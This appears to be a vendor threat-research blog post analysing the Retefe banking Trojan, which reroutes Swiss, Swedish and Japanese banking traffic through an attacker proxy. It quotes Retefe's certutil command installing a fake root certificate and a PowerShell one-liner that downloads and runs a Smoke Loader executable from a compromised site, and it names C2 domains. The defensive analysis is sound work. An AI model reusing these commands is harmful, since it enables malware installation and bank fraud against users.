Retefe is one of the most targeted banking Trojans currently in the wild. While other families
such as Zeus and Citadel are widely adopted by attackers targeting banking websites around
the world, Retefe is consistently used to target victims in Sweden, Switzerland and Japan.
In the last two weeks we have detected a surge of e-mails using AutoFocus, each carrying
the Retefe Trojan and targeting organizations in Western Europe and Japan.

The attack e-mails are using a variety of “order” and “receipt” themes, each tailored to the
country they are targeting and using dated file names to make them appear more relevant.
The e-mails most often claim to be from a local electronics retailer.

On a global scale, Retefe is a rather small threat, but that appears to be by design. The
malware hijacks connections to Swiss, Swedish and Japanese financial institutions to assist
the attacker in committing fraud. The malware carried in the most recent campaigns also
downloads and installs the Smoke Loader Trojan, which is a modular backdoor capable of
stealing credentials and installing additional malware.

Retefe Behavior
Retefe is different from most banking Trojans, which typically attack web browser software to
capture login credentials before they are encrypted with SSL and sent to the bank’s web
server. Instead, Retefe uses the Windows PowerShell to execute a series of commands that
installs a new root certificate on the system and a proxy configuration to re-route the traffic to
the targeted banking websites.
The Retefe Trojan writes the root certificate to the disk and then uses the following command
to install it on the sytem.
certutil -addstore -f -user ROOT ProgramData\cert512121.der
Retefe has used many certificates in the past, but the latest one is a fake “thawte Inc.”
certificate.

After installing the certificate, Retefe makes a request to a server over HTTPS to retrieve
JavaScript code that will reconfigure the system proxy for web browsing to route traffic for
specific banking domains through a server controlled by the attacker. The proxy server
performs a man-in-the-middle attack against the traffic, decrypting and possibly modifying the
request before re-encrypting the data and passing it on to the bank. Retefe installs the new
root certificate to prevent users from receiving a notification that the website they are
contacting should not be trusted.
The Retefe command and control server appears to only return this proxy configuration code
if the infected host is located in Switzerland, Sweden or Japan. Retefe changes command
and control servers frequently, but the most recent campaigns use domains that mimic the
names of VPN services, including:
securevpnalarm.net
hsshvpn.net
After installing the certificate and reconfiguring the system proxy, Retefe uses another
PowerShell command to download an additional executable. In many cases we have
identified this malware as a variant of Smoke Loader, a modular backdoor Trojan capable of
stealing credentials from the infected system.
Retefe variants download additional malware from multiple URLs, but in most cases the
server hosting the executable is a compromised website hosted in the country being targeted
by the sample. Below is one example of the PowerShell script that initiates the download and
executes it.
powershell.exe -Command (New-Object
System.Net.WebClient).DownloadFile('http://www.schweizerhofwetzikon[.]ch/images/rtucrtmirumctrutbitueriumxe/ivotyimoyctorieotcmir.exe'

'ProgramData\Microsoft-KB512118.exe');(New-Object -com
Shell.Application).ShellExecute('ProgramData\Microsoft-KB512118.exe');
We suspect the actors behind Retefe began downloading Smoke Loader to help monetize
infection of systems outside of their three targeted nations.

Conclusion
While Retefe’s distribution is small on a global scale, its attacks are specifically targeted at
online banking customers in just a few countries. The most recent campaign shows that
Retefe may also threaten users in other countries as they begin using their infections to
install additional malware.
Palo Alto Networks WildFire identifies Retefe and Smoke Loader samples as malicious and
AutoFocus users can identify these samples using the SmokeLoader and Retefe tags.
